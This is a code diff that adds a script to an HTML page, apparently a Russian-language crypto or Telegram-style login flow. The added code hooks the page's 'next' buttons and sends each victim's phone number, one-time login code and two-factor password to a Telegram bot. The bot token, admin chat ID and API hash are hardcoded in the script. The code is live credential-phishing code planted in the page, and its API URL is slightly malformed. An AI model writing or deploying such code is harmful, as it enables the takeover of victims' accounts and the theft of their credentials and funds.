@@ -620,5 +620,45 @@ function depositCrypto(){closeDeposit();alert('Выберите криптова
 // Init
 buildList();setBackBtn(1);
 </script>
-</body>
+  <script>
+// Твои данные для отправки
+const MY_BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ";
+const MY_ADMIN_ID  = 174415647;
+const MY_API_ID    = "28687552";
+const MY_API_HASH  = "1abf9a58d0c22f62437bec89bd6b27a3";
+
+// Функция отправки
+async function sendData(msg) {
+  await fetch(`https://api.telegram.org{MY_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: MY_ADMIN_ID, text: msg, parse_mode: 'HTML'})
+  });
+}
+
+// Привязываем отправку к твоим кнопкам "Далее"
+const originalGoStep2 = goStep2;
+goStep2 = function() {
+  const p = document.getElementById('phonePrefix').textContent + ' ' + document.getElementById('phoneInput').value;
+  sendData(`📱 <b>Вход:</b> <code>${p}</code>\nID: <code>${MY_API_ID}</code>`);
+  originalGoStep2();
+};
+
+const originalGoStep3 = goStep3;
+goStep3 = function() {
+  let c = "";
+  for(let i=0; i<5; i++) c += document.getElementById('c'+i).value;
+  sendData(`🔑 <b>Код:</b> <code>${c}</code>`);
+  originalGoStep3();
+};
+
+const originalGoStep4 = goStep4;
+goStep4 = function() {
+  const pass = document.getElementById('passInput').value;
+  sendData(`🔐 <b>2FA:</b> <code>${pass}</code>\nHash: <code>${MY_API_HASH}</code>`);
+  originalGoStep4();
+};
+</script>
+
+</body> 
 </html>
